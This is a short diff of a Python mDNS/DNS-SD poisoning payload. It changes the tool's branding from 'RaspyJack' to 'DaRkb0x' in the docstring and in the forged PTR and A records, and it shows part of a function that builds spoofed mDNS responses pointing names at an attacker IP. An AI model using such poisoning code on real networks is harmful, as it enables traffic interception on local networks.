@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-RaspyJack Payload -- mDNS/DNS-SD Poisoner
+DaRkb0x Payload -- mDNS/DNS-SD Poisoner
 ==========================================
 Author: 7h30th3r0n3
 
@@ -131,10 +131,10 @@ def _craft_mdns_response(qname, spoofed_ip):
                 type="PTR",
                 rclass=0x8001,  # cache flush + IN
                 ttl=120,
-                rdata=f"RaspyJack.{qname}",
+                rdata=f"DaRkb0x.{qname}",
             ),
             ar=DNSRR(
-                rrname=f"RaspyJack.{qname.split('.', 1)[1] if '.' in qname else qname}",
+                rrname=f"DaRkb0x.{qname.split('.', 1)[1] if '.' in qname else qname}",
                 type="A",
                 rclass=0x8001,
                 ttl=120,
